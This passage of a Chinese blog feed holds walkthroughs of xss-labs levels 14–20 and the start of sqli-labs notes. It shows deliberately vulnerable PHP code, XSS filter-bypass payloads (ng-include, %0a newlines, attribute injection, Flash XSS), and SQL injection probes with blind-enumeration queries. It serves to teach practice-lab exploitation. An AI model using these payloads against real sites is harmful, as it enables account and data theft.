class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="level-14——-exif-xss"><a href="#level-14——-exif-xss" class="headerlink" title="level 14—— exif xss"></a>level 14—— exif xss</h2><p>这一关现在是处于无法访问的状态，所以此处引用先知社区中的通关过程。如下</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529132533090.png" alt="image-20200529132533090"></p><p>查看源码发现通过iframe标签引入了一个<a href="http://exofvoewer.org/">http://exofvoewer.org</a>, 结合乌云爆出的漏洞</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/cf571588689622.jpg" alt="25.jpg"></p><p>本关因<code>iframe</code>调用的文件地址失效，无法进行测试。要考的应该是<strong>通过修改iframe调用的文件来实现xss注入</strong></p><h3 id="什么是exif-xss"><a href="#什么是exif-xss" class="headerlink" title="什么是exif xss"></a>什么是exif xss</h3><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/20191121175514709.png" alt="img"></p><p>上传一个含有xss代码的图片来触发xss</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/eb931588689622.jpg" alt="26.jpg"></p><p>将刚才的图片上传上去然后再访问发现触发弹框了</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/e0e21588689623.jpg" alt="27.jpg"></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/129e1588689624.jpg" alt="28.jpg"></p><p>其实这里可以自己简单复现一下这种触发XSS的环境。我这里先创建一个<code>exifxss.php</code>的文件，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$exif = exif_read_data(<span class="string">&#x27;test.jpg&#x27;</span>);</span><br><span class="line"></span><br><span class="line">var_dump($exif);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后在当前文件夹下面放一张名为test的正常图片，接着访问一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.bj.com/xss/exifxss.php</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/e2541588689624.jpg" alt="29.jpg"></p><p>可以看到将图片的<code>exif</code>信息都打印出来了。如果我们将图片的exif信息<code>改成</code>触发xss的<code>payload</code>呐？</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/e3e61588689624.jpg" alt="30.jpg"></p><p>可以看到已经在图片的exif信息中插入了触发xss的payload了。接下来再次访问试试看</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/f0d01588689625.jpg" alt="31.jpg"></p><p>源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level14<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;leftframe&quot;</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">&quot;http://www.exifviewer.org/&quot;</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">&quot;80%&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xss/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="level-15——-angularjs"><a href="#level-15——-angularjs" class="headerlink" title="level 15—— angularjs"></a>level 15—— angularjs</h2><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529142324125.png" alt="image-20200529142324125"></p><p><strong>URL：</strong><code>http://www.xsslabs.com/xss/level15.php?src=1.gif</code>而我们本地么有xss这个文件夹，所以我们的url为</p><p><code>http://www.xsslabs.com/level15.php?src=1.gif</code></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529142713599.png" alt="image-20200529142713599"></p><p>可以看到我们提交的参数<code>src</code>的值被插入到了标签的<code>class</code>属性值中，但是前面还有<code>ng-include</code>这样的字符</p><p><code>ng-include</code>是<code>angular js</code>中的东西，其作用相当于<code>php</code>的<code>include</code>函数。这里就是将<code>1.gif</code>这个文件给包含进来。</p><p>这里先<code>尝试</code>看看能不能直接<code>闭合标签</code>来触发弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=<span class="string">&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt; </span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529143118618.png" alt="image-20200529143118618"></p><p>可以看到一些字符被编码了。</p><p>查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;script src&#x3D;&quot;angular.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level16.php?keyword&#x3D;test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p align&#x3D;center&gt;&lt;img src&#x3D;level15.png&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;src&quot;];</span><br><span class="line">echo &#39;&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>既然此处用了<code>ng-include指令</code>的话，先了解一下其具体的用法。</p><h3 id="ng-include用法"><a href="#ng-include用法" class="headerlink" title="ng-include用法"></a>ng-include用法</h3><p>1、ng-include 指令用于包含<code>外部</code>的 HTML文件。</p><p>2、包含的内容将作为指定元素的<code>子节点</code>。</p><p>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</p><p>4、默认情况下，包含的文件需要包含在同一个域名下。</p><p><strong>特别值得注意的几点如下：</strong></p><p>1.ng-include,如果<code>单纯指定地址</code>，必须要<code>加引号</code></p><p>2.ng-include,加载外部html，<code>script</code>标签中的内容<code>不执行</code></p><p>3.ng-include,加载外部html中含有<code>style</code>标签样式可以<code>识别</code></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529144350901.png" alt="image-20200529144350901"></p><p>​        了解了该指令的大致用法之后，我们就不得不思考一下，既然这里可以包含html文件，那么也就可以包含之前有过xss漏洞的源文件了。比如构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=<span class="string">&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>​        因为这里参数值算是一个<code>地址</code>，所以需要添<code>加引号</code>。有的小伙伴可能就要有疑问了，之前不是说是包含html文件吗，但是level1.php是一个php文件吗？</p><p>​        这是因为我们不是单纯的去包含level1.php，而是在后面添加了参数值的。这就有点像是在<code>访问了该参数值中地址之后把它响应在浏览器端的html文件给包含进来的意思</code>。</p><p>​        根据ng-inculde的资料介绍，我们包含一个文件试试，因为<strong>默认情况下不允许包含其他域名的文件</strong>，那我们就包含一下这关的主页level1.php,注意单引号包起来</p><p>在浏览器端访问试一试效果</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529144234869.png" alt="image-20200529144234869"></p><p>可以看到成功触发弹窗了，而且在页面响应的下方还可以看到level1的页面。</p><p><strong>参考：</strong><code>http://0verflow.cn/?p=1764</code></p><p><strong>分析：</strong></p><p>原本的后端代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;&#39;;</span><br></pre></td></tr></table></figure><p>当我们提交src的值 <code>‘level1.php?name=&lt;a href=javascript:alert(/xss/)&gt;click here&lt;/a&gt;’</code>的时候，后端处理的实际操作时这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;&lt;a href&#x3D;javascript:alert(&#x2F;1&#x2F;)&gt;click here!&lt;&#x2F;a&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;&#39;;</span><br></pre></td></tr></table></figure><p>​        就会达到一种像sql注入时因闭合符号，而导致的语句发生改变的情况。实际上程序会认为这是一句<strong>ng-include命令</strong>，<strong>把ng-include:后面单引号包起的语句给进行包含显示在前端。</strong></p><h2 id="level-16-——-0a"><a href="#level-16-——-0a" class="headerlink" title="level 16 ——%0a"></a>level 16 ——%0a</h2><p>可以看到我们提交的参数值在页面中有一处显示位，接着看看网页源码</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529151447553.png" alt="image-20200529151447553"></p><p>可以看到这里并没有什么特殊的地方，只是参数值被插入到了标签中。那么先用最基本的弹窗代码测试一下吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529151635453.png" alt="image-20200529151635453"></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529151610475.png" alt="image-20200529151610475"></p><p>可以看到关键字<code>script</code>以及<code>/</code>符号、<code>空格</code>都被编码成同样的<code>空格字符实体</code>了。这样也没办法去闭合前面的标签了。所以先看看源文件的代码</p><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;&#x2F;&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>服务器端的操作跟我猜想的是一致的，但是这里<strong>要怎么才能绕过呐？</strong></p><p>​        因为这里把空格都编码了，也就意味着我们无法通过<code>空格</code>来将字符分隔进行语义的区分，不过我们还可以用<code>回车</code>来将它们分开。而且这里将<code>/</code>符号也编码了，所以我们需要的是一个<strong>不需要闭合的标签</strong>，比如之前所用过的<img>。</p><p>这里构造语句如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">”111”</span></span></span><br><span class="line"><span class="tag"><span class="attr">onerror</span>=<span class="string">alert(‘xss’)</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure><p>不过这里的回车怎么表示是一个问题，因为就像上面那样提交的话浏览器会将字符中间的多个间隔合并为一个空格。这里可以用<code>回车</code>的url编码格式<code>%0a</code>来表示。具体如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="tag">&lt;<span class="name">img%0asrc=”111”%0aonerror=alert(‘xss’)</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529154448281.png" alt="image-20200529154448281"><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529154459710.png" alt="image-20200529154459710"></p><p>可以看到网页源码中显示我们构造的代码是正常插入到标签中了的</p><p><strong>参考：</strong><code>http://0verflow.cn/?p=1782</code></p><h2 id="level-17-——args"><a href="#level-17-——args" class="headerlink" title="level 17 ——args"></a>level 17 ——args</h2><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529164739841.png" alt="image-20200529164739841"></p><p>可以看到我们提交的两个参数的值出现在了标签的src属性值中。猜测该标签应该就是突破口，然后用基本的弹窗代码测试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;<span class="function"><span class="params">arg02</span>=&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529165513613.png" alt="image-20200529165513613"></p><p>​        可以看到我们构造的代码中关键字都被编码了，这里应该就是用<code>htmlspecialchars</code>()函数处理过的。仔细观察一下发现这个<code>&lt;embed&gt;</code>标签就是引入一个swf文件到浏览器端，并且它的src属性值没有添加引号所以不用闭合。</p><p>考虑通过事件来触发。比如此处可以用onclick事件测试一下</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529165815176.png" alt="image-20200529165815176"></p><p>从网页源码中可以看到构造的恶意代码似乎正常插入了，然后点击页面响应中显示该swf文件区域的时候成功弹窗了。    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src&#x3D;xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width&#x3D;100% heigth&#x3D;100%&gt;&quot;;    &#x2F;&#x2F;拼接字符串</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源码可知道，我可以们利用<strong>html的特性会自动给等于号后面的参数添加双引号</strong>，在arg01的等于号后添加个空格，再看源码，结构发生了改变</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529171326143.png" alt="image-20200529171326143"></p><h2 id="level-18-同上一样的"><a href="#level-18-同上一样的" class="headerlink" title="level 18 同上一样的"></a>level 18 同上一样的</h2><h2 id="level-19——-flash-xss"><a href="#level-19——-flash-xss" class="headerlink" title="level 19—— flash xss"></a>level 19—— flash xss</h2><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529172715084.png" alt="image-20200529172715084"></p><p>​        可以看到这里与前两关<strong>唯一不同</strong>的地方就是src的值使用<strong>双引号</strong>括起来的。<code>如果想要成功执行js代码肯定需要去闭合标签，但是此处应该还是会用htmlspecialchars()函数进行处理，所以无法成功闭合。那还可以怎么突破呐？</code></p><p>​        这里可以看到src中值的形式是<code>xsf03.swf?a=b</code>。<strong>正常如果是引用一个文件好像是不需要传入参数值的，但是此处却有点像url地址的访问格式，也许突破口就在此处。</strong></p><p>经过一番百度之后终于了解到了一种xss攻击手段叫做<code>flash xss</code>。</p><h3 id="flash-xss"><a href="#flash-xss" class="headerlink" title="flash xss"></a>flash xss</h3><p>​        那么为什么取名为<code>flash xss</code>呢？</p><p>​        是因为<code>flash有可以调用js的函数，也就是可以和js进行通信</code>。因此这些函数如果使用不当也是会造成xss的。</p><p>​        常见的可触发xss的<strong>危险函数</strong>有：<code>getURL、navigateToURL、ExternalInterface.call、htmlText、loadMovie</code>等等。</p><p>​        要想知道这一关的是不是属于flash xss，只<strong>需要对引用的swf文件进行反编译然后进行源码分析</strong>。这里我说使用的对此类文件进行反编译的工具是<code>jpexs-decompiler</code>。</p><p><strong>项目地址:<a href="https://github.com/jindrapetrik/jpexs-decompiler">https://github.com/jindrapetrik/jpexs-decompiler</a></strong></p><p>下载之后进行安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &#39;&lt;embed src&#x3D;&quot;xsf03.swf?&#39;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#39;&quot; width&#x3D;100% heigth&#x3D;100%&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529173024803.png" alt="image-20200529173024803"></p><p>具体参考：<code>https://www.zhaosimeng.cn/writeup/119.html</code></p><h2 id="level-20——-flash-xss-同19难，以后弄懂再看"><a href="#level-20——-flash-xss-同19难，以后弄懂再看" class="headerlink" title="level 20—— flash xss(同19难，以后弄懂再看)"></a>level 20—— flash xss(同19难，以后弄懂再看)</h2><p><code>http://0verflow.cn/?p=1590</code></p>]]></content>
      
      
      <categories>
          
          <category> xss靶场学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2020/07/13/sqlo-labs/"/>
      <url>/2020/07/13/sqlo-labs/</url>
      
        <content type="html"><![CDATA[<p>SQL注入漏洞<code>主要形成的原因</code>是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”<code>拼接</code>到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p><p>在构建代码时，一般会从如下几个方面的策略来<strong>防止</strong>SQL注入漏洞：</p><ul><li>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</li><li>2.使用参数化（Parameterized Query 或 Parameterized Statement）；</li><li>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</li></ul><a id="more"></a><h1 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在sqli-labs代码中，加入以下：</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="如何报错信息"><a href="#如何报错信息" class="headerlink" title="如何报错信息"></a>如何报错信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;</span><br><span class="line">1&quot;</span><br><span class="line">&#39;</span><br></pre></td></tr></table></figure><h2 id="尝试语句"><a href="#尝试语句" class="headerlink" title="尝试语句"></a>尝试语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1&#39;</span><br><span class="line">1&quot;</span><br><span class="line">1&#39;))</span><br><span class="line">1&quot;))</span><br><span class="line"></span><br><span class="line">&#39;</span><br><span class="line">&#39;)</span><br><span class="line">&#39;))</span><br><span class="line">&quot;</span><br><span class="line">&quot;)</span><br><span class="line">&quot;))</span><br></pre></td></tr></table></figure><p><img src="/2020/07/13/sqlo-labs/image-20200521162142198.png" alt="image-20200521162142198"></p><h2 id="方法总结"><a href="#方法总结" class="headerlink" title="方法总结"></a>方法总结</h2><p>当没有错误提示时， 那么我们只能靠猜测进行注入  </p><ul><li>延时注入：</li></ul><h2 id="sql语句的写法"><a href="#sql语句的写法" class="headerlink" title="sql语句的写法"></a>sql语句的写法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;    Less1</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;        Less2</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;        Less3</span><br><span class="line"></span><br><span class="line">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;        #Less4:使用1&quot;产生错误-- use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1，表明sql 对 id 参数进行了 “” 和 () 的包装</span><br><span class="line"></span><br><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;                                        Less-6</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;    Less-7</span><br><span class="line"></span><br><span class="line">$uname&#x3D;&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;                                    Less-14</span><br><span class="line">$passwd&#x3D;&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; </span><br><span class="line">$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;$uname and password&#x3D;$passwd LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql 查询语句：</span><br><span class="line"></span><br><span class="line">查库： select schema_name from information_schema.schemata;</span><br><span class="line">查表： select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;;</span><br><span class="line">查列： select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">查字段： select username,password from security.users;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h2><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">left()函数：  left(database(),1)&#x3D;‘s’                     left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回0</span><br><span class="line"></span><br><span class="line">regexp函数：select user() regexp ‘r’                 user()的结果是root，regexp为匹配root的正则表达式</span><br><span class="line"></span><br><span class="line">like函数： select user() like ‘ro%’                        匹配与regexp相似。</span><br><span class="line"></span><br><span class="line">substr(a,b,c)   select substr() XXXX                       substr(a,b,c)从位置b开始，截取a字符串c位长度</span><br><span class="line"></span><br><span class="line">ascii()                                      将某个字符串转化为ascii值  </span><br><span class="line"></span><br><span class="line">chr(数字)   或者是ord(‘字母’)    使用python中的两个函数可以判断当前的ascii值是多少</span><br><span class="line">对于security数据库：</span><br><span class="line"></span><br><span class="line">select left(database(),1)&#x3D;‘s’;   前1位是否是s</span><br><span class="line"></span><br><span class="line">select database() regexp ‘s’;  匹配第一个字符是否是 s</span><br><span class="line"></span><br><span class="line">select database() like ‘s%’;     匹配第一个字符是否是 s</span><br><span class="line"></span><br><span class="line">select substr((select database()),1,1)&#x3D;&#39;s’; 匹配第一个字符是否是 s</span><br><span class="line"></span><br><span class="line">select substr((select database()),1,3)&#x3D; ‘sec’; 匹配前三个个字符是否是 sec</span><br><span class="line"></span><br><span class="line">select ascii(substr((select database()),1,1));    直接回显115  或者是：</span><br><span class="line"></span><br><span class="line">select ascii(substr((select database()),1,1)) &gt; 110;  如果大于110，就会返回1，否则返回0.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2020/07/13/sqlo-labs/image-20200521173132112.png" alt="image-20200521173132112"></p><p><img src="/2020/07/13/sqlo-labs/image-20200521173732135.png" alt="image-20200521173732135"></p><p><img src="/2020/07/13/sqlo-labs/image-20200521174643694.png" alt="image-20200521174643694"></p><p><img src="/2020/07/13/sqlo-labs/image-20200521175233603.png" alt="image-20200521175233603"></p><p>分析：</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" 